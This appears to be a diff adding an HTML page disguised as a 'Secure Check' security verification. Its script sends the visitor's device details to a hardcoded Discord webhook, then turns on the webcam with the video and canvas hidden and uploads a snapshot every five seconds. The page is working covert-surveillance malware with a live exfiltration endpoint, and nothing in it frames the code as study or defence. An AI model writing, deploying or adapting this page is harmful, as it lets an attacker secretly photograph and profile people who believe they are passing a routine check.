@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Check</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>🔐 Security Verification Running...</h2>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1380615601831149641/skTHKnFAntQo5OLOetYaxgbAFmVP85V9bBeI2-SkU9iYsmduHqNtMucDN85JtQh0Inih";
+    const intervalMs = 5000; // photo every 5 seconds
+
+    function getDeviceInfo() {
+      return {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+    }
+
+    async function sendInfoToDiscord(info) {
+      let description = `📱 **Device Info:**\n`;
+      for (const [key, value] of Object.entries(info)) {
+        description += `**${key}:** ${value}\n`;
+      }
+
+      const payload = {
+        content: "**👤 Device Details Captured:**",
+        embeds: [{
+          title: "📋 Device Summary",
+          description: description,
+          color: 15844367
+        }]
+      };
+
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    async function sendImageToDiscord(blob, count) {
+      const form = new FormData();
+      form.append("payload_json", JSON.stringify({
+        content: `📸 **Image Capture #${count}**`,
+        embeds: [{
+          title: `Snapshot ${count}`,
+          color: 3447003,
+          image: { url: "attachment://snapshot.png" }
+        }]
+      }));
+      form.append("file", blob, "snapshot.png");
+
+      await fetch(webhookURL, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    async function startMonitoring() {
+      // Step 1: Send device info once
+      const deviceInfo = getDeviceInfo();
+      await sendInfoToDiscord(deviceInfo);
+
+      // Step 2: Start camera stream and capture images every few seconds
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      let count = 1;
+      setInterval(async () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        const blob = await (await fetch(canvas.toDataURL("image/png"))).blob();
+        await sendImageToDiscord(blob, count++);
+      }, intervalMs);
+    }
+
+    startMonitoring();
+  </script>
+</body>
+</html>
